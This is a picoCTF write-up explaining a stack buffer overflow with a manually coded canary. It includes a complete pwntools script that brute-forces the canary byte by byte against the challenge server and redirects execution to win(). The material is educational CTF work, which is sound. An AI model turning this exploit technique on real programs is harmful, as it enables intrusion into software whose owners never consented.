---
title: "Buffer overflow 3"
date: "2025-07-24"
tags: ["picoCTF", "buffer overflow", "canary", "ret2win"]
---

This challenge gives us a binary and its C source.

```c
Arch:     i386
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

The binary wants a `canary.txt` in the current working directory, so we create it:

```bash
echo -n 'D3b0' > canary.txt
```

Once that is created the program works like this:

1. It asks us to set a size for a buffer
2. It asks us to enter a value into the buffer

```c
./vuln
How Many Bytes will You Write Into the Buffer?
> 10
Input> hola
Ok... Now Where's the Flag?
```

If we look at the code we can see the buffer overflow:

```c
read(0, buf, count);
```

This line **reads up to `count` bytes from input and writes them into the `buf` buffer**, without checking whether `count` is bigger than the buffer size (`64` bytes), which allows a buffer overflow.

```c
sscanf(length,"%d",&count);
```

So if we send 100 as the size we will be writing more into `buf` than the 64 byte maximum set earlier.

Now that we can do a buffer overflow, our goal is to reach the return address and send the program flow to the `win()` function. The binary has a hand made canary, that is why it does not show up in `checksec`. If we look at the code we can see a manual check with `memcpm` to detect whether we overwrote the canary:

```c
if (memcmp(canary,global_canary,CANARY_SIZE)) {
    printf("***** Stack Smashing Detected ***** : Canary ValueCorrupt!\n"); // crash immediately
    fflush(stdout);
    exit(0);
}
printf("Ok... Now Where's the Flag?\n");
fflush(stdout);
```

> Strictly speaking the binary has no canary, since `checksec` told us there is none, but the programmer who wrote the binary added a “manual canary“.

If we try to bruteforce the canary and nail the 4 bytes in one go we have a problem, because only 1 in 4.2 billion tries would succeed. There is a variant of this, which is finding the offset to the canary and bruteforcing it byte by byte, watching whether the program crashes or, in this case, whether we get the message `***** Stack Smashing Detected ***** : Canary Value Corrupt!`. That takes 1024 tries in the worst case and 512 on average.

So let's see what we have to do:

1. Send a buffer size greater than or equal to our final payload
2. Send to `buf` the bytes needed to reach the canary
3. Bruteforce the canary byte by byte
4. Work out the distance between the canary and `EIP` and fill that gap with more bytes
5. Send the address of the win function

```c
GRÁFICO

payloadFinal = b'A' * offset_hasta_canary + valor_canary + b'A' * offset_hasta_eip + direccion_win
```

Now we can write the script that does all this:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./vuln_patched")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("saturn.picoctf.net", 63053)

def main():
    offset = 64
    canary = b''
    chars = string.printable

    for i in range(4):  # Bruteforce de los 4 primeros bytes del canary
        for guess in chars:
            try:
                io = conn()
                payload = b'A' * offset + canary + guess.encode()
                io.sendlineafter(b'> ', str(len(payload)).encode())
                io.sendlineafter(b'> ', payload)
                response = io.recvline(timeout=1)

                if b'Smashing' not in response:
                    canary += p8(ord(guess))
                    info(f"[{i+1}/4] Byte encontrado: {hex(ord(guess))} -> Canary parcial: {canary}")
                    io.close()
                    break
                io.close()
            except Exception as e:
                print(f"[{i+1}/4] EXCEPCIÓN: {e}")
                try:
                    io.close()
                except:
                    pass

    print(f"\n[+] Canary completo encontrado: {canary}")
    payload += b'A' * 16
    payload += p32(exe.symbols.win)
    info(f'Payload: {payload}')
    
    io = conn()
    io.sendlineafter(b'> ', str(len(payload)).encode())
    io.sendlineafter(b'Input> ', payload)
    io.interactive()
if __name__ == "__main__":
    main()

```

We have the flag!

```c
Ok... Now Where's the Flag?
picoCTF{SECRETO}
```
